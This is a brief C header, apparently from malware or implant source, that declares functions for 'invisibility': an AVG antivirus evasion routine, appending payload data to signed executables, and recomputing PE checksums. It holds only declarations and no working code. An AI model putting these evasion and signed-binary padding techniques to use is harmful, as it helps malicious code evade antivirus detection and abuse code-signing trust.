/* methods required for specific invisibility issues */

typedef PIMAGE_NT_HEADERS (WINAPI *CHECKSUMMAPPEDFILE) ( _In_   PVOID BaseAddress,  _In_   DWORD FileLength,  _Out_  PDWORD HeaderSum,  _Out_  PDWORD CheckSum);

VOID AvgInvisibility();

LPBYTE AppendDataInSignedExecutable(LPWSTR lpTargetExecutable, LPBYTE lpPadData, DWORD dwPadDataSize, PDWORD dwFatExecutableSize);
LPBYTE AppendDataInSignedExecutable(HANDLE hExecutable, LPBYTE lpPadData, DWORD dwPadDataSize, PDWORD dwFatExecutableSize);
DWORD ComputePEChecksum(LPBYTE lpMz, DWORD dwBufferSize);